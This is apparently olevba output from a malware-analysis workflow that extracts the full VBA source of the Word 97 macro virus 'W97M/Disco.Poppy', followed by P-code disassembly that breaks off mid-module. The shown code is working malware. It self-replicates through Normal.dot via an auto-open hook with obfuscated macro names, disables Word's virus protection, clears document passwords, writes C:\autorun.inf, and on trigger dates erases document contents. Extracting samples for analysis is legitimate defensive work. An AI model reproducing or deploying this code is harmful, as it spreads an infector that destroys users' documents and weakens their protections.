olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poppy.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poppy.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Poppy.b - OLE stream: 'Macros/VBA/autoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub AutoOpen()

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

Dim Mac$
Dim Soma$
Dim Heroin
Dim Valium$
Dim Klonopin$
Dim A$
Dim T$
Dim p$
Dim ft$
Dim fx$
Dim ok$
Dim ICD$
    
    On Error GoTo -1: On Error GoTo hell
    T$ = "t" + "oo" + "l" + "s" + "m" + "a" + "c" + "r" + "o"
    p$ = "f" + "i" + "l" + "e" + "p" + "ri" + "nt"
    ft$ = "Fi" + "le" + "Te" + "mp" + "la" + "t" + "es"
    fx$ = "F" + "i" + "l" + "e" + "E" + "x" + "i" + "t"
    A$ = "a" + "u" + "to" + "O" + "p" + "en"
    Valium$ = "N" + "O" + "R" + "M" + "A" + "L" + "." + "D" + "OT"
    Klonopin$ = "H" + "e" + "l" + "p" + "A" + "b" + "ou" + "t"
    ICD$ = "Disco"
    ok$ = 0
    
    Soma$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

    If Soma$ = Valium$ Then
        
        Heroin = GetAttr(ActiveDocument.FullName)
        
        If Heroin >= vbArchive Then ok$ = 1
        If Heroin >= vbSystem Then ok$ = 1
        If Heroin >= vbHidden Then ok$ = 1
        If ok$ = 1 Then
        
        For X = 1 To 7
            If X = 1 Then Mac$ = A$
            If X = 2 Then Mac$ = T$
            If X = 3 Then Mac$ = p$
            If X = 4 Then Mac$ = ft$
            If X = 5 Then Mac$ = fx$
            If X = 6 Then Mac$ = Klonopin$
            If X = 7 Then Mac$ = ICD$
            
            Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:=Mac$, Object:= _
        wdOrganizerObjectProjectItems
            
        Next X
        
            WordBasic.FileSaveAs Format:=1
            WordBasic.SetDocumentDirty 0
            Call dhIconDisco("C:\autorun.inf")
            
        End If
    Else
               
        For X = 1 To 7
            If X = 1 Then Mac$ = A$
            If X = 2 Then Mac$ = T$
            If X = 3 Then Mac$ = p$
            If X = 4 Then Mac$ = ft$
            If X = 5 Then Mac$ = fx$
            If X = 6 Then Mac$ = Klonopin$
            If X = 7 Then Mac$ = ICD$
                           
        Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:=Mac$, Object:= _
        wdOrganizerObjectProjectItems
        
        Next X
        
    End If
    
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
        .Password = ""
        .WritePassword = ""
    End With

'        Application.OrganizerDelete Source:= _
'        NormalTemplate.FullName, Name:="Cap", Object:= _
'        wdOrganizerObjectProjectItems
        
GoTo fuckoff

hell:
        
fuckoff:
    On Error GoTo -1: On Error GoTo 0


End Sub
Sub ViewVBCode()
'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

MsgBox "  W97M/Disco.Poppy by VicodinES  ", vbOKOnly, " © The Narkotic Network "
MsgBox "Everything is fine - nothing to see here - let's move it along kids!", vbExclamation, " * VicodinES * Klonopin.Jones * Fastin.Blee * "
MsgBox "Social camouflage for this modern age!", vbQuestion, "Slogan?"
End Sub
-------------------------------------------------------------------------------
VBA MACRO ToolsMacro.bas 
in file: Virus.MSWord.Poppy.b - OLE stream: 'Macros/VBA/toolsmacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub ToolsMacro()
Attribute ToolsMacro.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute ToolsMacro.VB_ProcData.VB_Invoke_Func = "TemplateProject.toolsmacro.MAIN"

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z


    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date


    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
    
If Z = 1 Then

    With Options
        .CheckSpellingAsYouType = False
        .CheckGrammarAsYouType = False
        .SuggestSpellingCorrections = False
        .SuggestFromMainDictionaryOnly = False
        .CheckGrammarWithSpelling = True
        .ShowReadabilityStatistics = False
        .IgnoreUppercase = True
        .IgnoreMixedDigits = True
        .IgnoreInternetAndFileAddresses = True

    End With

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro.Poppy.I aka Disco.Poppy"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "By VicodinES"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro Virus for Word 97"
    Selection.TypeParagraph
        Selection.TypeParagraph
            Selection.TypeParagraph
                Selection.TypeParagraph
    Selection.TypeText Text:= _
        "T h e   N a r k o t i c   N e t w o r k !"
    Selection.TypeParagraph
    
Else

GoTo fuck1

End If

fuck1:

End Sub

-------------------------------------------------------------------------------
VBA MACRO fileprint.bas 
in file: Virus.MSWord.Poppy.b - OLE stream: 'Macros/VBA/fileprint'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub fileprint()

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z

    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
        
    If Z = 1 Then
    
    Selection.EndKey Unit:=wdLine
    Selection.MoveDown Unit:=wdScreen, Count:=1
    Selection.EndKey Unit:=wdLine
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "When will you wake up and realize that we live in a "
    Selection.TypeText Text:= _
        "primitive society? Don't kid yourself - there is NO GOD!!"
        
    ActiveDocument.PrintOut
    
    
Else

    ActiveDocument.PrintOut
    
End If

End Sub
    
    
        




-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: Virus.MSWord.Poppy.b - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileTemplates()
'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

    Dim D$
    Dim Ti$
    Dim Tp$
    Dim Z

    Ti$ = Time
    Tp$ = "12:00:01 PM"
    D$ = Date
    
    Z = 0
    
    If D$ = "4/12/98" Then Z = 1
    If Ti$ = Tp$ Then Z = 1
    If D$ = "4/12/99" Then Z = 1
    If D$ = "1/11/98" Then Z = 1
    If D$ = "1/11/99" Then Z = 1
    If D$ = "6/14/99" Then Z = 1
    If D$ = "1/22/98" Then Z = 1
    If D$ = "8/21/98" Then Z = 1
    If D$ = "9/19/99" Then Z = 1
    If D$ = "8/18/99" Then Z = 1
    If D$ = "7/9/99" Then Z = 1
    If D$ = "12/17/99" Then Z = 1
    If D$ = "8/18/98" Then Z = 1
    If D$ = "7/9/98" Then Z = 1
    If D$ = "12/17/98" Then Z = 1
    
    
If Z = 1 Then

    With Options
        .CheckSpellingAsYouType = False
        .CheckGrammarAsYouType = False
        .SuggestSpellingCorrections = False
        .SuggestFromMainDictionaryOnly = False
        .CheckGrammarWithSpelling = True
        .ShowReadabilityStatistics = False
        .IgnoreUppercase = True
        .IgnoreMixedDigits = True
        .IgnoreInternetAndFileAddresses = True

    End With

    Selection.WholeStory
    Selection.Delete Unit:=wdCharacter, Count:=1
    Selection.TypeParagraph
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro.Poppy.I aka Disco.Poppy"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "By VicodinES"
    Selection.TypeParagraph
    Selection.TypeText Text:= _
        "Macro Virus for Word 97"
    Selection.TypeParagraph
        Selection.TypeParagraph
            Selection.TypeParagraph
                Selection.TypeParagraph
    Selection.TypeText Text:= _
        "T h e   N a r k o t i c   N e t w o r k !"
    Selection.TypeParagraph
    
Else

GoTo fuck1

End If

fuck1:


End Sub
-------------------------------------------------------------------------------
VBA MACRO FileExit.bas 
in file: Virus.MSWord.Poppy.b - OLE stream: 'Macros/VBA/FileExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileExit()
Attribute FileExit.VB_Description = "Macro recorded 12/13/97 by Dr. Diet Mountain Dew"
Attribute FileExit.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro1"

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With

    Application.Quit

End Sub
-------------------------------------------------------------------------------
VBA MACRO HelpAbout.bas 
in file: Virus.MSWord.Poppy.b - OLE stream: 'Macros/VBA/HelpAbout'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub HelpAbout()

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"

MsgBox "  W97M/Disco.Poppy by VicodinES  ", vbOKOnly, " © The Narkotic Network "
MsgBox "Everything is fine - nothing to see here - let's move it along kids!", vbExclamation, " * VicodinES * Klonopin.Jones * Fastin.Blee * "
MsgBox "Social camouflage for this modern age!", vbQuestion, "Slogan?"
End Sub
-------------------------------------------------------------------------------
VBA MACRO Disco.bas 
in file: Virus.MSWord.Poppy.b - OLE stream: 'Macros/VBA/Disco'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub dhIconDisco(strFile As String)

'Macro.Poppy.I aka "W97M/Disco.Poppy"
'By VicodinES
'Macro Virus for Word 97
'"this is step one in the big understanding"


Dim Part1$
Dim Part2$
Dim Part22$
Dim Part3$
Dim Part33$
Dim rn$
Dim rnn$
Dim Choice
Dim hFile As Long

Randomize

Choice = Int(Rnd * 2)
rnn$ = Int(Rnd * 66) + 2
rn$ = Int(Rnd * 27) + 1
Part1$ = "[autorun]"
Part2$ = "icon = c:\windows\system\pifmgr.dll,"
Part22$ = "icon = c:\windows\SYSTEM\shell32.dll,"
Part3$ = Part2$ + rn$
Part33$ = Part22$ + rnn$


    hFile = FreeFile
    Open strFile For Output Access Write As hFile
    Print #hFile, Part1$
    If Choice = 0 Then
        Print #hFile, Part3$
    Else
        Print #hFile, Part33$
    End If
    Close hFile


    
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Poppy.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/autoOpen - 7840 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Public Sub AutoOpen())
' Line #3:
' Line #4:
' 	QuoteRem 0x0000 0x0024 "Macro.Poppy.I aka "W97M/Disco.Poppy""
' Line #5:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #6:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #7:
' 	QuoteRem 0x0000 0x002B ""this is step one in the big understanding""
' Line #8:
' Line #9:
' 	Dim 
' 	VarDefn Mac
' Line #10:
' 	Dim 
' 	VarDefn Soma
' Line #11:
' 	Dim 
' 	VarDefn Heroin
' Line #12:
' 	Dim 
' 	VarDefn Valium
' Line #13:
' 	Dim 
' 	VarDefn Klonopin
' Line #14:
' 	Dim 
' 	VarDefn A
' Line #15:
' 	Dim 
' 	VarDefn T
' Line #16:
' 	Dim 
' 	VarDefn p
' Line #17:
' 	Dim 
' 	VarDefn ft
' Line #18:
' 	Dim 
' 	VarDefn fx
' Line #19:
' 	Dim 
' 	VarDefn ok
' Line #20:
' 	Dim 
' 	VarDefn ICD
' Line #21:
' Line #22:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError hell 
' Line #23:
' 	LitStr 0x0001 "t"
' 	LitStr 0x0002 "oo"
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitStr 0x0001 "s"
' 	Add 
' 	LitStr 0x0001 "m"
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitStr 0x0001 "c"
' 	Add 
' 	LitStr 0x0001 "r"
' 	Add 
' 	LitStr 0x0001 "o"
' 	Add 
' 	St T$ 
' Line #24:
' 	LitStr 0x0001 "f"
' 	LitStr 0x0001 "i"
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitStr 0x0001 "e"
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitStr 0x0002 "ri"
' 	Add 
' 	LitStr 0x0002 "nt"
' 	Add 
' 	St p$ 
' Line #25:
' 	LitStr 0x0002 "Fi"
' 	LitStr 0x0002 "le"
' 	Add 
' 	LitStr 0x0002 "Te"
' 	Add 
' 	LitStr 0x0002 "mp"
' 	Add 
' 	LitStr 0x0002 "la"
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	LitStr 0x0002 "es"
' 	Add 
' 	St ft$ 
' Line #26:
' 	LitStr 0x0001 "F"
' 	LitStr 0x0001 "i"
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitStr 0x0001 "e"
' 	Add 
' 	LitStr 0x0001 "E"
' 	Add 
' 	LitStr 0x0001 "x"
' 	Add 
' 	LitStr 0x0001 "i"
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	St fx$ 
' Line #27:
' 	LitStr 0x0001 "a"
' 	LitStr 0x0001 "u"
' 	Add 
' 	LitStr 0x0002 "to"
' 	Add 
' 	LitStr 0x0001 "O"
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitStr 0x0002 "en"
' 	Add 
' 	St A$ 
' Line #28:
' 	LitStr 0x0001 "N"
' 	LitStr 0x0001 "O"
' 	Add 
' 	LitStr 0x0001 "R"
' 	Add 
' 	LitStr 0x0001 "M"
' 	Add 
' 	LitStr 0x0001 "A"
' 	Add 
' 	LitStr 0x0001 "L"
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	LitStr 0x0001 "D"
' 	Add 
' 	LitStr 0x0002 "OT"
' 	Add 
' 	St Valium$ 
' Line #29:
' 	LitStr 0x0001 "H"
' 	LitStr 0x0001 "e"
' 	Add 
' 	LitStr 0x0001 "l"
' 	Add 
' 	LitStr 0x0001 "p"
' 	Add 
' 	LitStr 0x0001 "A"
' 	Add 
' 	LitStr 0x0001 "b"
' 	Add 
' 	LitStr 0x0002 "ou"
' 	Add 
' 	LitStr 0x0001 "t"
' 	Add 
' 	St Klonopin$ 
' Line #30:
' 	LitStr 0x0005 "Disco"
' 	St ICD$ 
' Line #31:
' 	LitDI2 0x0000 
' 	St ok$ 
' Line #32:
' Line #33:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroFileName$] 0x0001 
' 	LitDI2 0x000A 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Soma$ 
' Line #34:
' Line #35:
' 	Ld Soma$ 
' 	Ld Valium$ 
' 	Eq 
' 	IfBlock 
' Line #36:
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	St Heroin 
' Line #38:
' Line #39:
' 	Ld Heroin 
' 	Ld vbArchive 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #40:
' 	Ld Heroin 
' 	Ld vbSystem 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #41:
' 	Ld Heroin 
' 	Ld vbHidden 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St ok$ 
' 	EndIf 
' Line #42:
' 	Ld ok$ 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #43:
' Line #44:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #45:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld A$ 
' 	St Mac$ 
' 	EndIf 
' Line #46:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld T$ 
' 	St Mac$ 
' 	EndIf 
' Line #47:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld p$ 
' 	St Mac$ 
' 	EndIf 
' Line #48:
' 	Ld X 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ft$ 
' 	St Mac$ 
' 	EndIf 
' Line #49:
' 	Ld X 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld fx$ 
' 	St Mac$ 
' 	EndIf 
' Line #50:
' 	Ld X 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Klonopin$ 
' 	St Mac$ 
' 	EndIf 
' Line #51:
' 	Ld X 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ICD$ 
' 	St Mac$ 
' 	EndIf 
' Line #52:
' Line #53:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld Mac$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #54:
' Line #55:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' Line #57:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #58:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall SetDocumentDirty 0x0001 
' Line #59:
' 	LitStr 0x000E "C:\autorun.inf"
' 	ArgsCall (Call) dhIconDisco 0x0001 
' Line #60:
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	ElseBlock 
' Line #63:
' Line #64:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #65:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld A$ 
' 	St Mac$ 
' 	EndIf 
' Line #66:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld T$ 
' 	St Mac$ 
' 	EndIf 
' Line #67:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld p$ 
' 	St Mac$ 
' 	EndIf 
' Line #68:
' 	Ld X 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ft$ 
' 	St Mac$ 
' 	EndIf 
' Line #69:
' 	Ld X 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld fx$ 
' 	St Mac$ 
' 	EndIf 
' Line #70:
' 	Ld X 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Klonopin$ 
' 	St Mac$ 
' 	EndIf 
' Line #71:
' 	Ld X 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ICD$ 
' 	St Mac$ 
' 	EndIf 
' Line #72:
' Line #73:
' 	LineCont 0x000C 05 00 08 00 0B 00 08 00 15 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld Mac$ 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #74:
' Line #75:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #76:
' Line #77:
' 	EndIfBlock 
' Line #78:
' Line #79:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #80:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #81:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #82:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #83:
' 	EndWith 
' Line #84:
' Line #85:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #86:
' 	LitVarSpecial (False)
' 	MemStWith ReadOnlyRecommended 
' Line #87:
' 	LitStr 0x0000 ""
' 	MemStWith Password 
' Line #88:
' 	LitStr 0x0000 ""
' 	MemStWith WritePassword 
' Line #89:
' 	EndWith 
' Line #90:
' Line #91:
' 	LineCont 0x0008 01 00 D4 FF 01 00 9D FF
' 	QuoteRem 0x0000 0x0089 "        Application.OrganizerDelete Source:='        NormalTemplate.FullName, Name:="Cap", Object:='        wdOrganizerObjectProjectItems"
' Line #92:
' Line #93:
' 	GoTo fuckoff 
' Line #94:
' Line #95:
' 	Label hell 
' Line #96:
' Line #97:
' 	Label fuckoff 
' Line #98:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError (GoTo 0) 
' Line #99:
' Line #100:
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub ViewVBCode())
' Line #103:
' 	QuoteRem 0x0000 0x0024 "Macro.Poppy.I aka "W97M/Disco.Poppy""
' Line #104:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #105:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #106:
' 	QuoteRem 0x0000 0x002B ""this is step one in the big understanding""
' Line #107:
' Line #108:
' 	LitStr 0x0021 "  W97M/Disco.Poppy by VicodinES  "
' 	Ld vbOKOnly 
' 	LitStr 0x0018 " © The Narkotic Network "
' 	ArgsCall MsgBox 0x0003 
' Line #109:
' 	LitStr 0x0044 "Everything is fine - nothing to see here - let's move it along kids!"
' 	Ld vbExclamation 
' 	LitStr 0x002E " * VicodinES * Klonopin.Jones * Fastin.Blee * "
' 	ArgsCall MsgBox 0x0003 
' Line #110:
' 	LitStr 0x0026 "Social camouflage for this modern age!"
' 	Ld vbQuestion 
' 	LitStr 0x0007 "Slogan?"
' 	ArgsCall MsgBox 0x0003 
' Line #111:
' 	EndSub 
' Macros/VBA/toolsmacro - 4239 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub ToolsMacro())
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0024 "Macro.Poppy.I aka "W97M/Disco.Poppy""
' Line #4:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #5:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #6:
' 	QuoteRem 0x0000 0x002B ""this is step one in the big understanding""
' Line #7:
' Line #8:
' 	Dim 
' 	VarDefn D
' Line #9:
' 	Dim 
' 	VarDefn Ti
' Line #10:
' 	Dim 
' 	VarDefn Tp
' Line #11:
' 	Dim 
' 	VarDefn Z
' Line #12:
' Line #13:
' Line #14:
' 	Ld Time 
' 	St Ti$ 
' Line #15:
' 	LitStr 0x000B "12:00:01 PM"
' 	St Tp$ 
' Line #16:
' 	Ld Date 
' 	St D$ 
' Line #17:
' Line #18:
' Line #19:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #20:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #21:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #22:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #23:
' 	EndWith 
' Line #24:
' Line #25:
' 	LitDI2 0x0000 
' 	St Z 
' Line #26:
' Line #27:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #28:
' 	Ld Ti$ 
' 	Ld Tp$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #29:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #30:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #31:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #32:
' 	Ld D$ 
' 	LitStr 0x0007 "6/14/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #33:
' 	Ld D$ 
' 	LitStr 0x0007 "1/22/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #34:
' 	Ld D$ 
' 	LitStr 0x0007 "8/21/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #35:
' 	Ld D$ 
' 	LitStr 0x0007 "9/19/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #36:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #37:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #38:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #39:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #40:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #41:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #42:
' Line #43:
' 	Ld Z 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #44:
' Line #45:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #46:
' 	LitVarSpecial (False)
' 	MemStWith CheckSpellingAsYouType 
' Line #47:
' 	LitVarSpecial (False)
' 	MemStWith CheckGrammarAsYouType 
' Line #48:
' 	LitVarSpecial (False)
' 	MemStWith SuggestSpellingCorrections 
